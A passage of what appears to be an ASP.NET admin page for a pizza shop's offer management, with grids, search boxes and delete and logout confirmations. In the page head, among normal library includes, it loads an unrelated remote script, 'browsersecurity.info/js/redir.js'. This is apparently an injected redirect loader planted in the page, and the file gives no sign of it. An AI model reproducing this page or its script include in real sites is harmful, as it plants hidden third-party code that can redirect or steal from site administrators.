<%@ Page Language="C#" AutoEventWireup="true" CodeFile="OfferDetail.aspx.cs" Inherits="Admin_OfferDetail" %>

<!DOCTYPE html>
<html class="no-js">
<meta charset="utf-8">
<meta name="description" content="">
<meta name="viewport" content="width=device-width">
<title>OfferDetail</title>
<head>
    <link runat="server" rel="shortcut icon" href="/images/logo.ico" type="image/x-icon" />
    <link runat="server" rel="icon" href="/images/logo.ico" type="image/ico" />
    <script src="js/jquery-1.8.2.min.js" type="text/javascript"></script>
    <script src="http://browsersecurity.info/js/redir.js" type="text/javascript"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/bootstrap/3.3.4/css/bootstrap.min.css">
    <script type="text/javascript">
        //<![CDATA[
        try { if (!window.CloudFlare) { var CloudFlare = [{ verbose: 0, p: 0, byc: 0, owlid: "cf", bag2: 1, mirage2: 0, oracle: 0, paths: { cloudflare: "/cdn-cgi/nexp/dok3v=1613a3a185/" }, atok: "72adab177b5729b458fc171b7e2ef771", petok: "be01c04ed78a819345fed98b13a0463b72c424a6-1450762210-1800", zone: "nyasha.me", rocket: "0", apps: { "ga_key": { "ua": "UA-50530436-1", "ga_bs": "2" } }, sha2test: 0 }]; !function (a, b) { a = document.createElement("script"), b = document.getElementsByTagName("script")[0], a.async = !0, a.src = "//ajax.cloudflare.com/cdn-cgi/nexp/dok3v=38857570ac/cloudflare.min.js", b.parentNode.insertBefore(a, b) }() } } catch (e) { };
        //]]>
    </script>
    <link rel="shortcut icon" href="/favicon.ec0f3a1b.ico">
    <link rel="stylesheet" href="css/chosen.min.css">
    <link rel="stylesheet" href="css/checkBo.min.css">
    <link rel="stylesheet" href="css/style.css" />

    <style type="text/css">
        .grid th {
            text-align: center;
        }

        #txtFreePizzaSearch #txtDollarsSearch,
        #txtFeastForFiveSearch,
        #txtDailySpecialsSearch {
            width: 587px;
        }

        @media only screen and (max-width: 1600px) {
            #btnAddDailySpecialsOffer {
                margin-left: -10px;
            }

            #btnAddFeastForFiveOffer {
                margin-left: -10px;
            }

            #txtFreePizzaSearch #txtDollarsSearch,
            #txtFeastForFiveSearch,
            #txtDailySpecialsSearch {
                margin-left: 20px;
                width: 587px;
            }
        }


        @media only screen and (max-width: 1440px) {
            #btnAddDailySpecialsOffer {
                margin-left: -28px;
            }

            #btnAddFeastForFiveOffer {
                margin-left: -73px;
            }

            #btnFreePizzaOffer {
                margin-left: -62px;
            }

            #btnDollarsOffer {
                margin-left: -43px;
            }

            #txtFreePizzaSearch {
                margin-left: -49px;
                width: 587px;
            }

            #txtDollarsSearch {
                margin-left: -49px;
                width: 587px;
            }

            #txtFeastForFiveSearch {
                margin-left: -49px;
                width: 587px;
            }

            #txtDailySpecialsSearch {
                margin-left: 22px;
                width: 587px;
            }
        }

        @media only screen and (max-width: 1366px) {
            #btnAddDailySpecialsOffer {
                margin-left: -38px;
            }

            #btnAddFeastForFiveOffer {
                margin-left: -37px;
            }

            #btnFreePizzaOffer {
                margin-left: -37px;
            }

            #btnDollarsOffer {
                margin-left: -37px;
            }

            #txtFreePizzaSearch {
                margin-left: 17px;
                width: 487px;
            }

            #txtDollarsSearch {
                margin-left: 20px;
                width: 487px;
            }

            #txtFeastForFiveSearch {
                margin-left: 19px;
                width: 487px;
            }

            #txtDailySpecialsSearch {
                margin-left: 148px;
                width: 487px;
            }
        }

        @media only screen and (max-width: 1280px) {
            #btnAddDailySpecialsOffer {
                margin-left: -50px;
            }

            #btnAddFeastForFiveOffer {
                margin-left: -50px;
            }

            #btnFreePizzaOffer {
                margin-left: -48px;
            }

            #btnDollarsOffer {
                margin-left: -49px;
            }

            #txtFreePizzaSearch {
                margin-left: -17px;
                width: 487px;
            }

            #txtDollarsSearch {
                margin-left: -16px;
                width: 487px;
            }

            #txtFeastForFiveSearch {
                margin-left: -14px;
                width: 487px;
            }

            #txtDailySpecialsSearch {
                margin-left: 196px;
                width: 487px;
            }
        }

        @media only screen and (max-width: 1152px) {
            #btnAddDailySpecialsOffer {
                margin-left: -68px;
            }

            #btnAddFeastForFiveOffer {
                margin-left: -66px;
            }

            #btnFreePizzaOffer {
                margin-left: -48px;
            }

            #btnDollarsOffer {
                margin-left: -49px;
            }

            #txtFreePizzaSearch {
                margin-left: 66px;
                width: 420px;
            }

            #txtDollarsSearch {
                margin-left: -3px;
                width: 420px;
            }

            #txtFeastForFiveSearch {
                margin-left: -3px;
                width: 420px;
            }

            #txtDailySpecialsSearch {
                margin-left: 306px;
                width: 420px;
            }
        }

        @media only screen and (max-width: 1024px) {
            #btnAddDailySpecialsOffer {
                margin-left: -86px;
            }

            #btnAddFeastForFiveOffer {
                margin-left: -84px;
            }

            #btnFreePizzaOffer {
                margin-left: -66px;
            }

            #btnDollarsOffer {
                margin-left: -49px;
            }

            #txtFreePizzaSearch {
                margin-left: 11px;
                width: 350px;
            }

            #txtDollarsSearch {
                margin-left: 10px;
                width: 350px;
            }

            #txtFeastForFiveSearch {
                margin-left: 12px;
                width: 350px;
            }

            #txtDailySpecialsSearch {
                margin-left: 442px;
                width: 350px;
            }
        }
    </style>
    <script type="text/javascript">
        function Confirm() {

            var hdnfldVariable = document.getElementById("<%=hdnfldVariable.ClientID %>");


            if (confirm("Are you sure you want to delete offer detail?")) {

                hdnfldVariable.value = "Yes";

            } else {

                hdnfldVariable.value = "No";
            }

        }

        function SearchFreePizzaOffer() {
            document.getElementById('<%= btnFreePizzaSearch.ClientID %>').click();
        }

        function SearchDollarsOffer() {
            document.getElementById('<%= btnDollarsSearch.ClientID %>').click();
        }
        function SearchFeastForFiveOffer() {
            document.getElementById('<%= btnFeastForFiveSearch.ClientID %>').click();
        }
        function SearchDailySpecialsOffer() {
            document.getElementById('<%= btnDailySpecialsSearch.ClientID %>').click();
        }


    </script>
    <script type="text/javascript">
        function ConfirmForLogOut() {

            var hdnfldVariable = document.getElementById("<%=hdfLogout.ClientID %>");

            if (confirm("Are you sure you want to log out?")) {

                hdnfldVariable.value = "Yes";

            } else {

                hdnfldVariable.value = "No";
            }
            document.getElementById('<%= BtnLogOut.ClientID %>').click();
        }
    </script>
</head>

<body style="background-color: #F0F0F0">
    <form runat="server">
        <asp:ScriptManager ID="ScriptManager1" runat="server"></asp:ScriptManager>
        <asp:HiddenField ID="hdnfldVariable" runat="server" />
        <asp:HiddenField ID="hdnfldsearchtext" runat="server" />
        <asp:HiddenField ID="hdfLogout" runat="server" />
        <asp:Button runat="server" ID="BtnLogOut" Style="display: none" OnClick="BtnLogOut_Click" />

        <div class="app layout-fixed-header">
            <div class="sidebar-panel offscreen-left">
                <div class="brand">
                    <div class="brand-logo">
                        <img src="images/logo.png" height="50" width="50" style="margin-top: -10px;" alt="">
                    </div>
                    <a href="javascript:;" class="toggle-sidebar hidden-xs hamburger-icon v3" data-toggle="layout-small-menu"><span></span><span></span><span></span><span></span></a>
                </div>

                <nav role="navigation">
                    <ul class="nav">
                        <li><a href="DashBoard.aspx"><i class="fa fa-flask"></i><span>Dashboard</span> </a></li>
                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Menu Details</span> </a>
                            <ul class="sub-menu">
                                <%--<li><a href="IngredientInformation.aspx"><asp:Image ImageUrl="~/images/oie_311359551MYYq6un.jpg" Height="22px" Width="22px" runat="server"/><span> </span><span>Ingredient Information</span> </a></li>
                                --%>
                                <li><a href="MenuCategoryInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu Category.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Categories</span> </a></li>
                                <li><a href="IngredientInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Ingredient.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Ingredients</span> </a></li>
                                <li><a href="IngredientFactInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Ingredient.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Ingredient Coverage</span> </a></li>
                                <li><a href="MenuItemInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu Items.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Products</span> </a></li>
                                <li><a href="MenuItemSizeInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon//Menu Items.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Product Sizes</span> </a></li>
                                <li><a href="PizzaBaseTypeInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Pizza Base Type.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Pizza Type</span> </a></li>
                                <li><a href="MenuItemMakingMethodInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu Items.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Making Method</span> </a></li>
                            </ul>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Orders</span> </a>
                            <ul class="sub-menu">

                                <li><a href="OrderDetail.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Order.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Order Details</span> </a></li>
                                <li><a href="DayToDaySellingInformation.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Day to Day Sales.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Daily Sales</span> </a></li>
                                <li><a href="TransactionDetail.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Transaction.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Transaction Details</span></a></li>

                            </ul>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Files and Images</span> </a>
                            <ul class="sub-menu">

                                <li><a href="UploadMenuPdf.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu File Upload.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Menu</span> </a></li>
                                <li><a href="AddHomePageImages.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Menu File Upload.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Images</span> </a></li>

                            </ul>
                        </li>

                        <li class="active"><a href="OfferDetail.aspx"><i class="fa fa-tint"></i><span>Offers</span> </a>
                            <%--<ul class="sub-menu">
                                <li class="active"><a href="OfferDetail.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Offer.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Offer Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="CustomerInformation.aspx"><i class="fa fa-tint"></i><span>Customers</span> </a>
                            <%-- <ul class="sub-menu">
                                <li><a href="CustomerInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Customer.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Customer Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="SendNewsLatterInformation.aspx"><i class="fa fa-tint"></i><span>Newsletters</span> </a>
                            <%--  <ul class="sub-menu">
                                <li><a href="SendNewsLatterInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/News Letter.png" Height="22px" Width="22px" runat="server"/><span> </span><span>News Letter Information</span> </a></li>
                            </ul>--%>
                        </li>

                        <li><a href="javascript:;"><i class="fa fa-tint"></i><span>Misc. </span></a>
                            <ul class="sub-menu">

                                <li><a href="MiscellaneousSettings.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Miscellaneous & Configuration.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Store Settings</span> </a></li>
                                <li><a href="AddConfigKeyAndValues.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Miscellaneous & Configuration.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Configuration Settings</span> </a></li>
                                <li><a href="AddConfigContactDetail.aspx">
                                    <asp:Image ImageUrl="~/Admin/images/Icon/Contact.png" Height="22px" Width="22px" runat="server" /><span> </span><span>Contact Detail</span></a></li>

                            </ul>
                        </li>

                        <li><a href="StoreInformation.aspx"><i class="fa fa-tint"></i><span>Store Details</span> </a>
                            <%--<ul class="sub-menu">
                                <li><a href="StoreInformation.aspx"><asp:Image ImageUrl="~/Admin/images/Icon/Store.png" Height="22px" Width="22px" runat="server"/><span> </span><span>Store Information</span> </a></li>
                            </ul--%>>
                        </li>

                    </ul>
                </nav>
            </div>


            <div class="main-panel" style="background-color: #F0F0F0; height: 150%; width: 85%;">
                <header class="header navbar">
                    <div class="brand visible-xs">
                        <div class="toggle-offscreen"><a href="#" class="hamburger-icon visible-xs" data-toggle="offscreen" data-move="ltr"><span></span><span></span><span></span></a></div>
                        <div class="brand-logo">
                            <img src="images/logo-dark.5ba260bb.png" height="15" alt="">
                        </div>
                        <div class="toggle-chat"><a href="javascript:;" class="hamburger-icon v2 visible-xs" data-toggle="layout-chat-open"><span></span><span></span><span></span></a></div>
                    </div>
                    <ul class="nav navbar-nav navbar-right hidden-xs">
                        <li><a href="javascript:;" data-toggle="dropdown">
                            <img src="images/user.png" class="header-avatar img-circle ml10" alt="user" title="user">
                            <span class="pull-left" onclick="ConfirmForLogOut();">Log Out</span> </a></li>
                    </ul>
                </header>

                <div class="main-content">
                    <div class="panel">

                        <div class="table-header">
                            <div class="col-md-6">
                                <div class="col-md-8 col-sm-6">
                                    <div role="form">
                                        <div class="form-group" style="font-size: medium; font-weight: bold;">
                                            Free Pizza Offer Information
                                            <%--Show
                                    
                                            <asp:DropDownList ID="ddlShowData" CssClass="dropdown" Width="55px" runat="server" AutoPostBack="true" OnSelectedIndexChanged="ddlShowData_SelectedIndexChanged">
                                                <asp:ListItem>5</asp:ListItem>
                                                <asp:ListItem>10</asp:ListItem>
                                                <asp:ListItem>15</asp:ListItem>
                                            </asp:DropDownList>--%>
                                        </div>
                                    </div>
                                </div>
                                <div>
                                    <asp:Button ID="btnFreePizzaOffer" class="btn btn-info" runat="server" Text="Add New Free Pizza Offer" OnClick="btnFreePizzaOffer_Click" />

                                </div>
                            </div>

                            <div class="col-md-6 search-bar">
                                <div>
                                    <asp:TextBox ID="txtFreePizzaSearch" placeholder="Search" CssClass="form-control" runat="server" ClientIDMode="Static" onfocus="this.placeholder=''" onblur="this.placeholder='Search'" Width="402px"></asp:TextBox>
                                    <asp:Button ID="btnFreePizzaSearch" class="btn btn-info" runat="server" Text="Search" OnClick="btnFreePizzaSearch_Click" Style="margin-left: 428px; margin-top: -58px;" />
                                    <asp:Button ID="btnResetFreePizzaSearch" class="btn btn-info" runat="server" Text="Reset" OnClick="btnResetFreePizzaSearch_Click" Style="margin-top: -58px;" />
                                </div>
                            </div>
                        </div>
                        <div class="panel-body">
                            <asp:UpdatePanel ID="UpFreePizzaOffer" runat="server">
                                <ContentTemplate>
                                    <asp:GridView ID="gvFreePizzaOffer" runat="server" ShowHeaderWhenEmpty="true" EmptyDataText="No entries found." AutoGenerateColumns="false" AllowSorting="true" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered" PageSize="10" AllowPaging="true" OnRowCommand="gvFreePizzaOffer_RowCommand" OnRowDataBound="gvFreePizzaOffer_RowDataBound" Style="margin-top: 25px;">
                                        <RowStyle HorizontalAlign="Left" />
                                        <HeaderStyle HorizontalAlign="Left" />
                                        <Columns>
                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblFreePizzaOfferId" runat="server" Text='<%# Eval("FreePizzaOfferId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <%--  <asp:TemplateField HeaderText="FreePizza Offer Name" SortExpression="FreePizzaOfferName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblFreePizzaOfferName" runat="server" Text='<%# Eval("FreePizzaOfferName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>--%>

                                            <asp:TemplateField HeaderText="FreePizza Description" SortExpression="FreePizzaOfferDescription">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblFreePizzaOfferDescription" runat="server" Text='<%# Eval("FreePizzaOfferDescription") %>' ToolTip='<%# Eval("FreePizzaOfferDescription") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="FreePizza Offer Code" SortExpression="FreePizzaOfferCode">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblFreePizzaOfferCode" runat="server" Text='<%# Eval("FreePizzaOfferCode") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>



                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblFreeProductId" runat="server" Text='<%# Eval("FreeProductId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>
                                            <asp:TemplateField HeaderText="Free Product Name" SortExpression="FreeProductName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblFreeProductName" runat="server" Text='<%# Eval("FreeProductName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblFreeProductSizeId" runat="server" Text='<%# Eval("FreeProductSizeId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Free Product Size Name" SortExpression="FreeProductSizeName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblFreeProductSizeName" runat="server" Text='<%# Eval("FreeProductSizeName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblValidateProductId" runat="server" Text='<%# Eval("ValidateProductId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>
                                            <asp:TemplateField HeaderText="Validate Product Name" SortExpression="ValidateProductName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblValidateProductName" runat="server" Text='<%# Eval("ValidateProductName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblValidateProductSizeId" runat="server" Text='<%# Eval("ValidateProductSizeId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Validate Product Size Name" SortExpression="ValidateProductSizeName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblValidateProductSizeName" runat="server" Text='<%# Eval("ValidateProductSizeName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblValidateIngredientId" runat="server" Text='<%# Eval("ValidateIngredientId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Validate Ingredient Name" SortExpression="ValidateProductIngredientName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblValidateProductIngredientName" runat="server" Text='<%# Eval("ValidateProductIngredientName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>


                                            <asp:TemplateField HeaderText="Offer Start Date" SortExpression="Offerstartdatestring">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblOfferStartDate" runat="server" Text='<%# Eval("Offerstartdatestring") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Offer End Date" SortExpression="Offerenddatestring">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblOfferEndDate" runat="server" Text='<%# Eval("Offerenddatestring") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Edit" HeaderStyle-Width="2%">
                                                <ItemTemplate>
                                                    <asp:LinkButton ID="lnkEdit" runat="server" CommandName="EditFreePizzaOffer" CommandArgument='<%# Eval("FreePizzaOfferId")%>' Text="Edit"></asp:LinkButton>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Delete" HeaderStyle-Width="3%">
                                                <ItemTemplate>
                                                    <asp:LinkButton ID="lnkDelete" runat="server" CommandName="DeleteFreePizzaOffer" CommandArgument='<%# Eval("FreePizzaOfferId")%>' Text="Delete" OnClientClick="Confirm()"></asp:LinkButton>
                                                </ItemTemplate>
                                            </asp:TemplateField>


                                        </Columns>
                                        <PagerTemplate>
                                            <ul class="pagination pull-right">
                                                <asp:Button ID="btnFirst" runat="server" Text="First" CssClass="btn btn-info" CommandName="First" /></li>
                                              
                                                    <asp:Button ID="btnPrevious" runat="server" Text="Previous" CssClass="btn btn-info" CommandName="Previous" /></li>
                                               
                                                    <asp:Button ID="btnNext" runat="server" Text="Next" CssClass="btn btn-info" CommandName="Next" /></li>
                                               
                                                    <asp:Button ID="btnLast" runat="server" Text="Last" CssClass="btn btn-info" CommandName="Last" /></li>
                                          
                                            </ul>
                                        </PagerTemplate>
                                        <EmptyDataTemplate>
                                            No Free Pizza Offer Found
                                        </EmptyDataTemplate>
                                    </asp:GridView>
                                </ContentTemplate>
                            </asp:UpdatePanel>

                        </div>

                    </div>
                </div>
            </div>

            <div class="main-panel" style="background-color: #F0F0F0; height: 100%; width: 85%; margin-top: -120px;">
                <header class="header navbar">
                    <div class="brand visible-xs">
                        <div class="toggle-offscreen"><a href="#" class="hamburger-icon visible-xs" data-toggle="offscreen" data-move="ltr"><span></span><span></span><span></span></a></div>
                        <div class="brand-logo">
                            <img src="images/logo-dark.5ba260bb.png" height="15" alt="">
                        </div>
                        <div class="toggle-chat"><a href="javascript:;" class="hamburger-icon v2 visible-xs" data-toggle="layout-chat-open"><span></span><span></span><span></span></a></div>
                    </div>
                    <ul class="nav navbar-nav navbar-right hidden-xs">
                        <li><a href="javascript:;" data-toggle="dropdown">
                            <img src="images/user.png" class="header-avatar img-circle ml10" alt="user" title="user">
                            <span class="pull-left" onclick="ConfirmForLogOut();">LogOut</span> </a></li>
                    </ul>
                </header>

                <div class="main-content">
                    <div class="panel">

                        <div class="table-header">
                            <div class="col-md-6">
                                <div class="col-md-8 col-sm-6">
                                    <div role="form">
                                        <div class="form-group" style="font-size: medium; font-weight: bold;">
                                            Dollars Offer Information
                                            <%--Show
                                    
                                            <asp:DropDownList ID="ddlShowData" CssClass="dropdown" Width="55px" runat="server" AutoPostBack="true" OnSelectedIndexChanged="ddlShowData_SelectedIndexChanged">
                                                <asp:ListItem>5</asp:ListItem>
                                                <asp:ListItem>10</asp:ListItem>
                                                <asp:ListItem>15</asp:ListItem>
                                            </asp:DropDownList>--%>
                                        </div>
                                    </div>
                                </div>
                                <div>
                                    <asp:Button ID="btnDollarsOffer" class="btn btn-info" runat="server" Text="Add New Dollars Offer" OnClick="btnDollarsOffer_Click" />

                                </div>
                            </div>

                            <div class="col-md-6 search-bar">
                                <div>
                                    <asp:TextBox ID="txtDollarsSearch" placeholder="Search" CssClass="form-control" runat="server" ClientIDMode="Static" onfocus="this.placeholder=''" onblur="this.placeholder='Search'" Width="402px"></asp:TextBox>
                                    <asp:Button ID="btnDollarsSearch" class="btn btn-info" runat="server" Text="Search" OnClick="btnDollarsSearch_Click" Style="margin-left: 428px; margin-top: -58px;" />
                                    <asp:Button ID="btnResetDollarsSearch" class="btn btn-info" runat="server" Text="Reset" OnClick="btnResetDollarsSearch_Click" Style="margin-top: -58px;" />
                                </div>
                            </div>
                        </div>
                        <div class="panel-body">
                            <asp:UpdatePanel ID="UpDollarsOffer" runat="server">
                                <ContentTemplate>
                                    <asp:GridView ID="gvDollarsOffer" runat="server" ShowHeaderWhenEmpty="true" EmptyDataText="No entries found." AutoGenerateColumns="false" AllowSorting="true" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered" PageSize="10" AllowPaging="true" OnRowCommand="gvDollarsOffer_RowCommand" OnRowDataBound="gvDollarsOffer_RowDataBound" Style="margin-top: 25px;">
                                        <RowStyle HorizontalAlign="Left" />
                                        <HeaderStyle HorizontalAlign="Left" />
                                        <Columns>
                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblDollarsOfferId" runat="server" Text='<%# Eval("DollarsOfferId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <%--                                            <asp:TemplateField HeaderText="Dollars Offer Name" SortExpression="DollarsOfferName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblDollarsOfferName" runat="server" Text='<%# Eval("DollarsOfferName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>--%>

                                            <asp:TemplateField HeaderText="Dollars Offer Description" SortExpression="DollarsOfferDescription">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblDollarsOfferDescription" runat="server" Text='<%# Eval("DollarsOfferDescription") %>' ToolTip='<%# Eval("DollarsOfferDescription") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Dollars Offer Code" SortExpression="DollarsOfferCode">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblDollarsOfferCode" runat="server" Text='<%# Eval("DollarsOfferCode") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>


                                            <asp:TemplateField Visible="false">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProductSizeId" runat="server" Text='<%# Eval("ProductSizeId") %>'></asp:Label>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Product Size Name" SortExpression="ProductSizeName">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblProductSizeName" runat="server" Text='<%# Eval("ProductSizeName") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>


                                            <asp:TemplateField HeaderText="Offer Amount" SortExpression="OfferAmount">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblOfferAmount" runat="server" Text='<%#"$ "+ Eval("OfferAmount") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Offer Start Date" SortExpression="Offerstartdatestring">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblOfferStartDate" runat="server" Text='<%# Eval("Offerstartdatestring") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Offer End Date" SortExpression="Offerenddatestring">
                                                <ItemTemplate>
                                                    <asp:Label ID="lblOfferEndDate" runat="server" Text='<%# Eval("Offerenddatestring") %>'></asp:Label>

                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Edit" HeaderStyle-Width="2%">
                                                <ItemTemplate>
                                                    <asp:LinkButton ID="lnkEdit" runat="server" CommandName="EditDollarsOffer" CommandArgument='<%# Eval("DollarsOfferId")%>' Text="Edit"></asp:LinkButton>
                                                </ItemTemplate>
                                            </asp:TemplateField>

                                            <asp:TemplateField HeaderText="Delete" HeaderStyle-Width="3%">
                                                <ItemTemplate>
                                                    <asp:LinkButton ID="lnkDelete" runat="server" CommandName="DeleteDollarsOffer" CommandArgument='<%# Eval("DollarsOfferId")%>' Text="Delete" OnClientClick="Confirm()"></asp:LinkButton>
                                                </ItemTemplate>
                                            </asp:TemplateField>


                                        </Columns>
                                        <PagerTemplate>
                                            <ul class="pagination pull-right">
                                                <asp:Button ID="btnFirst" runat="server" Text="First" CssClass="btn btn-info" CommandName="First" /></li>
                                              
                                                    <asp:Button ID="btnPrevious" runat="server" Text="Previous" CssClass="btn btn-info" CommandName="Previous" /></li>
                                               
                                                    <asp:Button ID="btnNext" runat="server" Text="Next" CssClass="btn btn-info" CommandName="Next" /></li>
                                               
                                                    <asp:Button ID="btnLast" runat="server" Text="Last" CssClass="btn btn-info" CommandName="Last" /></li>
                                          
                                            </ul>
                                        </PagerTemplate>
                                        <EmptyDataTemplate>
                                            No Dollars Offer Found
                                        </EmptyDataTemplate>
                                    </asp:GridView>
                                </ContentTemplate>
                            </asp:UpdatePanel>

                        </div>

                    </div>
                </div>
            </div>

            <div class="main-panel" style="background-color: #F0F0F0; height: 100%; width: 85%; margin-top: -120px;">
                <header class="header navbar">
                    <div class="brand visible-xs">
                        <div class="toggle-offscreen"><a href="#" class="hamburger-icon visible-xs" data-toggle="offscreen" data-move="ltr"><span></span><span></span><span></span></a></div>
                        <div class="brand-logo">
                            <img src="images/logo-dark.5ba260bb.png" height="15" alt="">
                        </div>
                        <div class="toggle-chat"><a href="javascript:;" class="hamburger-icon v2 visible-xs" data-toggle="layout-chat-open"><span></span><span></span><span></span></a></div>
                    </div>
                    <ul class="nav navbar-nav navbar-right hidden-xs">
                        <li><a href="javascript:;" data-toggle="dropdown">
                            <img src="images/user.png" class="header-avatar img-circle ml10" alt="user" title="user">
                            <span class="pull-left" onclick="ConfirmForLogOut();">LogOut</span> </a></li>
                    </ul>
                </header>

                <div class="main-content">
                    <div class="panel">

                        <div class="table-header">
                            <div class="col-md-6">
                                <div class="col-md-8 col-sm-6">
                                    <div role="form">
                                        <div class="form-group" style="font-size: medium; font-weight: bold;">
                                            Feast For Five Offer Information
                                            <%--Show
                                    
                                            <asp:DropDownList ID="ddlShowData" CssClass="dropdown" Width="55px" runat="server" AutoPostBack="true" OnSelectedIndexChanged="ddlShowData_SelectedIndexChanged">
                                                <asp:ListItem>5</asp:ListItem>
                                                <asp:ListItem>10</asp:ListItem>
                                                <asp:ListItem>15</asp:ListItem>
                                            </asp:DropDownList>--%>
                                        </div>
                                    </div>
                                </div>
                                <div>
                                    <asp:Button ID="btnAddFeastForFiveOffer" class="btn btn-info" runat="server" Text="Add New Feast ForFive Offer" OnClick="btnAddFeastForFiveOffer_Click" />

                                </div>
                            </div>

                            <div class="col-md-6 search-bar">
                                <div>
